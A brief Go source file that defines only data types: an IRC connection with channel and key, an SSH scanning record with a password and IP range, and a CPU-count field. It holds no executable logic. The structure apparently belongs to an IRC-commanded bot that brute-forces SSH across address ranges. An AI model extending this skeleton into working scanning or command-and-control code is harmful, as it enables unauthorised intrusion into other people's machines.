package pkg

import (
	"net"

	"golang.org/x/crypto/ssh"
)

type IRC struct {
	Report           net.Conn
	Channel, ChanKey string
}

type SCAN struct {
	s_session        *ssh.Client
	s_paswd, ipRange string
}

type INFO struct {
	ncpu int
}
